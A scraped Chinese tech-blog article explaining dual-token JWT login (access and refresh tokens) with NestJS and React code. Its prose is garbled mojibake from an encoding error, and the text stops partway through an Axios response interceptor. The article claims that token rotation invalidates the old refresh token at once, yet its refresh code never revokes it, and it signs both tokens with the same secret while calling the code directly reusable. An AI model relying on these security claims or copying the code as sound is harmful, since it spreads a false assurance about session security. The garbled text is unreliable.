                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ç°ä»£å‰åç«¯åˆ†ç¦»æ¶æ„ä¸­ï¼Œç”¨æˆ·è®¤è¯ä¸æƒé™æ§åˆ¶æ˜¯ç³»ç»Ÿå®‰å…¨çš„ç¬¬ä¸€é“é˜²çº¿ã€‚å• Token æ–¹æ¡ˆè™½ç„¶ç®€å•ï¼Œä½†éš¾ä»¥å…¼é¡¾<strong>å®‰å…¨æ€§</strong>ä¸<strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼šçŸ­æœ‰æ•ˆæœŸçš„ Token ä¼šé¢‘ç¹ä¸­æ–­ç”¨æˆ·æ“ä½œï¼Œè€Œé•¿æœ‰æ•ˆæœŸçš„ Token åˆ™å­˜åœ¨è¢«ç›—ç”¨åé•¿æœŸæœ‰æ•ˆçš„é£é™©ã€‚</p>
<p><strong>åŒ Token æœºåˆ¶ï¼ˆaccess_token + refresh_tokenï¼‰</strong> æ­£æ˜¯ä¸ºè§£å†³è¿™ä¸€çŸ›ç›¾è€Œç”Ÿâ€”â€”å®ƒé€šè¿‡ä¸¤ä¸ªèŒè´£åˆ†æ˜ã€ç”Ÿå‘½å‘¨æœŸä¸åŒçš„ Tokenï¼Œåœ¨ä¿éšœæ¥å£å®‰å…¨çš„åŒæ—¶ï¼Œå®ç°â€œæ— æ„Ÿç»­æœŸâ€çš„ä¸æ»‘ä½“éªŒã€‚</p>
<p>æœ¬æ–‡å°†èšç„¦äº <strong>åŒ Token ç™»å½•æ¨¡å—çš„æ ¸å¿ƒé€»è¾‘å®ç°</strong>ï¼ŒåŸºäº NestJSï¼ˆåç«¯ï¼‰ä¸ Reactï¼ˆå‰ç«¯ï¼‰æŠ€æœ¯æ ˆï¼Œæ·±å…¥å‰–æä»ç™»å½•ç”Ÿæˆ Tokenã€è¯·æ±‚æºå¸¦ Tokenã€åˆ°è¿‡æœŸè‡ªåŠ¨åˆ·æ–°çš„å®Œæ•´é“¾è·¯ã€‚æ‰€æœ‰ä»£ç å‡æ¥è‡ªçœŸå®é¡¹ç›®ï¼Œé€»è¾‘ä¸¥è°¨ã€å¯ç›´æ¥å¤ç”¨ï¼ŒåŠ©ä½ æ„å»ºé«˜å®‰å…¨ã€é«˜å¯ç”¨çš„è®¤è¯ä½“ç³»ã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€åŒTokenæœºåˆ¶ï¼šä¸ºä»€ä¹ˆæ˜¯â€œæœ€ä½³å®è·µâ€ï¼Ÿ</h2>
<h3 data-id="heading-2">1.1 æ ¸å¿ƒè§’è‰²åˆ†å·¥</h3>
<ul>
<li>
<p><strong><code>access_token</code>ï¼ˆè®¿é—®ä»¤ç‰Œï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šç”¨äºè®¿é—®å—ä¿æŠ¤çš„ API æ¥å£ï¼ˆå¦‚å‘å¸ƒæ–‡ç« ã€ä¿®æ”¹èµ„æ–™ï¼‰ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š<strong>çŸ­æ—¶æ•ˆ</strong>ï¼ˆé€šå¸¸ 10~30 åˆ†é’Ÿï¼‰ï¼Œä¸€æ—¦æ³„éœ²ï¼Œæ”»å‡»çª—å£æå°ã€‚</li>
<li><strong>ä¼ è¾“æ–¹å¼</strong>ï¼šæ”¾åœ¨ HTTP è¯·æ±‚å¤´ <code>Authorization: Bearer &lt;token&gt;</code> ä¸­ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>refresh_token</code>ï¼ˆåˆ·æ–°ä»¤ç‰Œï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šä»…ç”¨äºè°ƒç”¨ <code>/auth/refresh</code> æ¥å£ï¼Œæ¢å–æ–°çš„ <code>access_token</code>ï¼ˆå’Œæ–°çš„ <code>refresh_token</code>ï¼‰ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š<strong>é•¿æ—¶æ•ˆ</strong>ï¼ˆå¦‚ 7 å¤©ï¼‰ï¼Œä½†<strong>ç»ä¸ç”¨äºä¸šåŠ¡æ¥å£</strong>ï¼Œæå¤§é™ä½æš´éœ²é£é™©ã€‚</li>
<li><strong>å­˜å‚¨å»ºè®®</strong>ï¼šå‰ç«¯åº”å­˜äº <code>HttpOnly Cookie</code> æˆ–å®‰å…¨çš„æŒä¹…åŒ–å­˜å‚¨ï¼ˆå¦‚åŠ å¯† localStorageï¼‰ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>âœ… <strong>å®‰å…¨ä¼˜åŠ¿</strong>ï¼šå³ä½¿ <code>access_token</code> è¢«çªƒå–ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•é•¿æœŸä½¿ç”¨ï¼›è‹¥ <code>refresh_token</code> è¢«ç›—ï¼Œå› å…¶ä¸å‚ä¸ä¸šåŠ¡è¯·æ±‚ï¼Œæ£€æµ‹å’Œæ’¤é”€ä¹Ÿæ›´å®¹æ˜“ã€‚</p>
</blockquote>
<h3 data-id="heading-3">1.2  å®Œæ•´æµç¨‹</h3>
<p>ç”¨æˆ·ç™»å½•æ—¶ï¼Œå‰ç«¯å‘é€è´¦å·å¯†ç è‡³åç«¯ <code>/auth/login</code> æ¥å£ã€‚åç«¯éªŒè¯é€šè¿‡åï¼Œç­¾å‘ä¸€å¯¹ Tokenï¼šçŸ­æ—¶æ•ˆï¼ˆ15åˆ†é’Ÿï¼‰çš„ <code>access_token</code> ç”¨äºè®¿é—®ä¸šåŠ¡æ¥å£ï¼Œé•¿æ—¶æ•ˆï¼ˆ7å¤©ï¼‰çš„ <code>refresh_token</code> ä»…ç”¨äºåˆ·æ–°ã€‚å‰ç«¯å°†åŒ Token æŒä¹…åŒ–å­˜å‚¨ï¼Œå¹¶åœ¨åç»­è¯·æ±‚å¤´ä¸­è‡ªåŠ¨æºå¸¦ <code>access_token</code>ã€‚</p>
<p>å½“ <code>access_token</code> è¿‡æœŸï¼Œåç«¯è¿”å› 401ã€‚å‰ç«¯æ‹¦æˆªè¯¥é”™è¯¯ï¼Œè‹¥å­˜åœ¨æœ‰æ•ˆ <code>refresh_token</code>ï¼Œåˆ™è°ƒç”¨ <code>/auth/refresh</code> è·å–æ–° Token å¯¹ï¼ˆå®ç° Token è½®æ¢ï¼Œæ—§ refresh_token ç«‹å³å¤±æ•ˆï¼‰ã€‚åˆ·æ–°æœŸé—´çš„å¹¶å‘è¯·æ±‚è¢«æš‚å­˜é˜Ÿåˆ—ï¼Œå¾…æ–° <code>access_token</code> è¿”å›åç»Ÿä¸€é‡å‘ï¼Œå…¨ç¨‹ç”¨æˆ·æ— æ„Ÿã€‚</p>
<p>è‹¥ <code>refresh_token</code> ä¹Ÿè¿‡æœŸï¼Œåˆ™æ¸…ç©ºæœ¬åœ°çŠ¶æ€å¹¶è·³è½¬ç™»å½•é¡µã€‚è¯¥æœºåˆ¶å…¼é¡¾å®‰å…¨ï¼ˆçŸ­ Token + è½®æ¢ï¼‰ä¸ä½“éªŒï¼ˆè‡ªåŠ¨ç»­æœŸï¼‰ï¼Œæ˜¯å‰åç«¯åˆ†ç¦»æ¶æ„ä¸‹çš„è®¤è¯æœ€ä½³å®è·µã€‚</p>
<hr/>
<h2 data-id="heading-4">äºŒã€åç«¯å®ç°ï¼šNestJS å¦‚ä½•ç”Ÿæˆä¸éªŒè¯åŒTokenï¼Ÿ</h2>
<blockquote>
<p>âš ï¸ ä»¥ä¸‹ä»£ç åŸºäºå·²æ­å»ºå¥½çš„ NestJS é¡¹ç›®ï¼Œä»…èšç„¦è®¤è¯æ¨¡å—æ ¸å¿ƒé€»è¾‘ã€‚</p>
</blockquote>
<h3 data-id="heading-5">2.1 ç™»å½•æ¥å£ï¼šç”ŸæˆåŒTokenå¯¹</h3>
<p>ç™»å½•æˆåŠŸåï¼Œåç«¯éœ€åŒæ—¶ç”Ÿæˆ <code>access_token</code> å’Œ <code>refresh_token</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/auth/auth.service.ts</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">generateTokens</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span>, name: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> payload = { <span class="hljs-attr">sub</span>: id, name }; <span class="hljs-comment">// sub æ˜¯ JWT è§„èŒƒå­—æ®µï¼Œä»£è¡¨ä¸»ä½“ï¼ˆç”¨æˆ·IDï¼‰</span>
  
  <span class="hljs-keyword">const</span> [at, rt] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">jwtService</span>.<span class="hljs-title function_">signAsync</span>(payload, {
      <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">'15m'</span>,
      <span class="hljs-attr">secret</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">TOKEN_SECRET</span>
    }),
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">jwtService</span>.<span class="hljs-title function_">signAsync</span>(payload, {
      <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">'7d'</span>,
      <span class="hljs-attr">secret</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">TOKEN_SECRET</span>
    })
  ]);

  <span class="hljs-keyword">return</span> { <span class="hljs-attr">access_token</span>: at, <span class="hljs-attr">refresh_token</span>: rt };
}
</code></pre>
<h4 data-id="heading-6">å…³é”®è®¾è®¡ç‚¹ï¼š</h4>
<ul>
<li><strong><code>Promise.all</code> å¹¶å‘ç”Ÿæˆ</strong>ï¼šJWT ç­¾åæ¶‰åŠåŠ å¯†è¿ç®—ï¼Œä¸²è¡Œæ‰§è¡Œä¼šå¢åŠ å“åº”æ—¶é—´ï¼Œå¹¶å‘å¯æå‡æ€§èƒ½ã€‚</li>
<li><strong>ç»Ÿä¸€ Payload ç»“æ„</strong>ï¼šä¸¤ä¸ª Token ä½¿ç”¨ç›¸åŒçš„è½½è·ï¼ˆç”¨æˆ· ID å’Œç”¨æˆ·åï¼‰ï¼Œä¾¿äºåç»­è§£æä¸€è‡´æ€§ã€‚</li>
<li><strong><code>sub</code> å­—æ®µè§„èŒƒ</strong>ï¼šsub æ˜¯ JWT è§„èŒƒå­—æ®µï¼Œä»£è¡¨ä¸»ä½“ï¼ˆç”¨æˆ·IDï¼‰</li>
</ul>
<h3 data-id="heading-7">2.2 åˆ·æ–°æ¥å£ï¼šToken è½®æ¢ï¼ˆToken Rotationï¼‰</h3>
<p>å½“ <code>access_token</code> è¿‡æœŸï¼Œå‰ç«¯è°ƒç”¨ <code>/auth/refresh</code> è·å–æ–° Tokenï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">refreshToken</span>(<span class="hljs-params">rt: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> payload = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">jwtService</span>.<span class="hljs-title function_">verifyAsync</span>(rt, {
      <span class="hljs-attr">secret</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">TOKEN_SECRET</span>
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateTokens</span>(payload.<span class="hljs-property">sub</span>, payload.<span class="hljs-property">name</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">'Refresh Token å·²å¤±æ•ˆï¼Œè¯·é‡æ–°ç™»å½•'</span>);
  }
}
</code></pre>
<h4 data-id="heading-8">ä¸ºä½•è¦â€œè½®æ¢â€ï¼Ÿ</h4>
<ul>
<li><strong>å®‰å…¨æ€§å¢å¼º</strong>ï¼šæ¯æ¬¡åˆ·æ–°éƒ½ç”Ÿæˆ<strong>å…¨æ–°çš„ <code>refresh_token</code></strong>ï¼Œæ—§çš„ç«‹å³å¤±æ•ˆã€‚å³ä½¿æ—§ <code>refresh_token</code> è¢«ç›—ï¼Œä¹Ÿæ— æ³•å†æ¬¡ä½¿ç”¨ã€‚</li>
<li><strong>é˜²æ­¢ Token æ— é™ç»­æœŸ</strong>ï¼šé¿å…ç”¨æˆ·â€œæ°¸è¿œä¸ç™»å‡ºâ€ï¼Œç¬¦åˆæœ€å°æƒé™åŸåˆ™ã€‚</li>
</ul>
<blockquote>
<p>ğŸ›¡ï¸ <strong>è¿›é˜¶å»ºè®®</strong>ï¼šç”Ÿäº§ç¯å¢ƒå¯å°† <code>refresh_token</code> å­˜å…¥ Redisï¼Œå¹¶è®¾ç½® TTLï¼ˆå¦‚ 7 å¤©ï¼‰ï¼ŒåŒæ—¶ç»´æŠ¤ä¸€ä¸ªâ€œé»‘åå•â€ç”¨äºå¼ºåˆ¶ä¸‹çº¿ã€‚</p>
</blockquote>
<h3 data-id="heading-9">2.3 é‰´æƒå®ˆå«ï¼šä¿æŠ¤æ•æ„Ÿæ¥å£</h3>
<p>NestJS é€šè¿‡ <code>Guard</code> + <code>Strategy</code> å®ç°å£°æ˜å¼é‰´æƒï¼š</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// jwt.strategy.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtStrategy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">PassportStrategy</span>(<span class="hljs-params"><span class="hljs-type">Strategy</span></span>) </span>{
  constructor() {
    <span class="hljs-keyword">super</span>({
      jwtFromRequest: <span class="hljs-type">ExtractJwt</span>.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: <span class="hljs-literal">false</span>,
      secretOrKey: process.env.<span class="hljs-type">TOKEN_SECRET</span>
    });
  }

  validate(payload) {
    <span class="hljs-keyword">return</span> { id: payload.sub, name: payload.name }; <span class="hljs-comment">// æŒ‚è½½åˆ° req.user</span>
  }
}
</code></pre>
<p>åœ¨æ§åˆ¶å™¨ä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Post</span>()
<span class="hljs-variable">@UseGuards</span>(JwtAuthGuard)
<span class="hljs-built_in">createPost</span>(<span class="hljs-variable">@Req</span>() req) {
  <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">userId</span> = <span class="hljs-selector-tag">req</span><span class="hljs-selector-class">.user</span><span class="hljs-selector-class">.id</span>; <span class="hljs-comment">// è‡ªåŠ¨è·å–å½“å‰ç”¨æˆ·ID</span>
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>åœ¨ NestJS ä¸­ï¼Œ<strong>Strategyï¼ˆç­–ç•¥ï¼‰</strong> è´Ÿè´£å…·ä½“çš„è®¤è¯é€»è¾‘ï¼Œæ¯”å¦‚ä»è¯·æ±‚å¤´æå– JWT å¹¶éªŒè¯å…¶æœ‰æ•ˆæ€§ï¼ŒéªŒè¯é€šè¿‡åè¿”å›ç”¨æˆ·ä¿¡æ¯ï¼›å®ƒä¸æ§åˆ¶è¯·æ±‚æµç¨‹ï¼Œåªåšèº«ä»½è§£æã€‚è€Œ <strong>Guardï¼ˆå®ˆå«ï¼‰</strong> æ˜¯ NestJS çš„æ‰§è¡Œé’©å­ï¼Œè¿è¡Œåœ¨æ§åˆ¶å™¨ä¹‹å‰ï¼Œç”¨äºå†³å®šæ˜¯å¦æ”¾è¡Œè¯·æ±‚ã€‚Guard ä¼šè°ƒç”¨å¯¹åº”çš„ Strategyï¼šè‹¥è®¤è¯æˆåŠŸï¼Œå°†ç”¨æˆ·ä¿¡æ¯æŒ‚è½½åˆ° <code>req.user</code> å¹¶å…è®¸è¿›å…¥è·¯ç”±ï¼›è‹¥å¤±è´¥ï¼ˆå¦‚ Token æ— æ•ˆæˆ–è¿‡æœŸï¼‰ï¼Œåˆ™ç›´æ¥æŠ›å‡º 401 é”™è¯¯ï¼Œä¸­æ–­åç»­æ“ä½œã€‚é€šå¸¸ï¼Œ<code>JwtStrategy</code> å®ç° JWT éªŒè¯ï¼Œ<code>JwtAuthGuard</code> å°è£…è¯¥ç­–ç•¥å¹¶ä½œä¸ºå®ˆå«ä½¿ç”¨ã€‚äºŒè€…åˆ†å·¥æ˜ç¡®ï¼šStrategy æ˜¯â€œéªŒç¥¨å‘˜â€ï¼ŒGuard æ˜¯â€œå®ˆé—¨äººâ€ï¼Œå…±åŒå®ç°å®‰å…¨ã€å¯å¤ç”¨çš„é‰´æƒæœºåˆ¶ã€‚</p>
<h4 data-id="heading-10">å®ˆå«å·¥ä½œæµç¨‹ï¼š</h4>
<ol>
<li>è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œå®ˆå«æ‹¦æˆªï¼›</li>
<li>ä» <code>Authorization</code> å¤´æå– <code>Bearer &lt;token&gt;</code>ï¼›</li>
<li>éªŒè¯ç­¾åã€æ£€æŸ¥æ˜¯å¦è¿‡æœŸï¼›</li>
<li>è‹¥æœ‰æ•ˆï¼Œè°ƒç”¨ <code>validate()</code>ï¼Œç»“æœæŒ‚è½½åˆ° <code>req.user</code>ï¼›</li>
<li>æ§åˆ¶å™¨æ–¹æ³•ä¸­ç›´æ¥ä½¿ç”¨ <code>req.user</code>ï¼Œæ— éœ€æ‰‹åŠ¨è§£æ Tokenã€‚</li>
</ol>
<blockquote>
<p>â— <strong>å¸¸è§å‘</strong>ï¼šè‹¥æŠ¥é”™ <code>Unknown authentication strategy "jwt"</code>ï¼Œè¯·ç¡®ä¿ <code>JwtStrategy</code> å·²åœ¨ <code>AuthModule</code> çš„ <code>providers</code> ä¸­æ³¨å†Œã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-11">ä¸‰ã€å‰ç«¯å®ç°ï¼šReact å¦‚ä½•ç®¡ç†ä¸è‡ªåŠ¨åˆ·æ–° Tokenï¼Ÿ</h2>
<p>å‰ç«¯çš„æ ¸å¿ƒæŒ‘æˆ˜æ˜¯ï¼š<strong>å¦‚ä½•åœ¨ Token è¿‡æœŸæ—¶ï¼Œè‡ªåŠ¨åˆ·æ–°å¹¶é‡è¯•å¤±è´¥è¯·æ±‚ï¼Œä¸”ä¸é€ æˆé‡å¤åˆ·æ–°æˆ–æ­»å¾ªç¯ï¼Ÿ</strong></p>
<h3 data-id="heading-12">3.1 Token æŒä¹…åŒ–ï¼šZustand + persist</h3>
<p>ä½¿ç”¨ Zustand çš„ <code>persist</code> ä¸­é—´ä»¶ï¼Œå°† Token å­˜å…¥ <code>localStorage</code>ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// useUserStore.ts</span>
<span class="hljs-selector-tag">export</span> <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">useUserStore</span> = <span class="hljs-selector-tag">create</span>&lt;<span class="hljs-selector-tag">UserState</span>&gt;()(
  <span class="hljs-built_in">persist</span>(
    (set) =&gt; ({
      <span class="hljs-attribute">accessToken</span>: null,
      <span class="hljs-attribute">refreshToken</span>: null,
      <span class="hljs-attribute">user</span>: null,
      <span class="hljs-attribute">isLogin</span>: false,
      <span class="hljs-attribute">login</span>: async (credentials) =&gt; {
        const res = await <span class="hljs-built_in">doLogin</span>(credentials);
        <span class="hljs-built_in">set</span>({ ...res, <span class="hljs-attribute">isLogin</span>: true }); <span class="hljs-comment">// å­˜å‚¨ access_token, refresh_token, user</span>
      },
      <span class="hljs-attribute">logout</span>: () =&gt; { <span class="hljs-comment">/* æ¸…ç©ºçŠ¶æ€ */</span> }
    }),
    {
      <span class="hljs-attribute">name</span>: <span class="hljs-string">'user-store'</span>,
      <span class="hljs-attribute">partialize</span>: (state) =&gt; ({
        <span class="hljs-attribute">accessToken</span>: state.accessToken,
        <span class="hljs-attribute">refreshToken</span>: state.refreshToken,
        <span class="hljs-attribute">user</span>: state.user,
        <span class="hljs-attribute">isLogin</span>: state.isLogin
      })
    }
  )
);
</code></pre>
<blockquote>
<p>âœ… <strong>ä¼˜åŠ¿</strong>ï¼šé¡µé¢åˆ·æ–°åçŠ¶æ€ä¸ä¸¢å¤±ï¼Œç”¨æˆ·æ— éœ€é‡æ–°ç™»å½•ã€‚</p>
</blockquote>
<h3 data-id="heading-13">3.2 Axios æ‹¦æˆªå™¨ï¼šè‡ªåŠ¨æºå¸¦ä¸æ™ºèƒ½åˆ·æ–°</h3>
<p>è¿™æ˜¯å‰ç«¯æœ€æ ¸å¿ƒçš„é€»è¾‘â€”â€”<strong>è¯·æ±‚æ‹¦æˆªå™¨ + å“åº”æ‹¦æˆªå™¨ååŒå·¥ä½œ</strong>ã€‚</p>
<h4 data-id="heading-14">è¯·æ±‚æ‹¦æˆªå™¨ï¼šè‡ªåŠ¨æ³¨å…¥ Token</h4>
<pre><code class="hljs language-ini" lang="ini">instance.interceptors.request.use((config) =&gt; {
  const <span class="hljs-attr">token</span> = useUserStore.getState().accessToken<span class="hljs-comment">;</span>
  if (token) {
    <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${token}</span>`<span class="hljs-comment">;</span>
  }
  return config<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-15">å“åº”æ‹¦æˆªå™¨ï¼šå¤„ç† 401 ä¸ Token åˆ·æ–°</h4>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">isRefreshing</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
let requestsQueue: ((token: string) =&gt; void)<span class="hljs-section">[]</span> = <span class="hljs-section">[]</span><span class="hljs-comment">;</span>

instance.interceptors.response.use(
  (res) =&gt; res.data,
  async (err) =&gt; {
    const { config, response } = err<span class="hljs-comment">;</span>
    
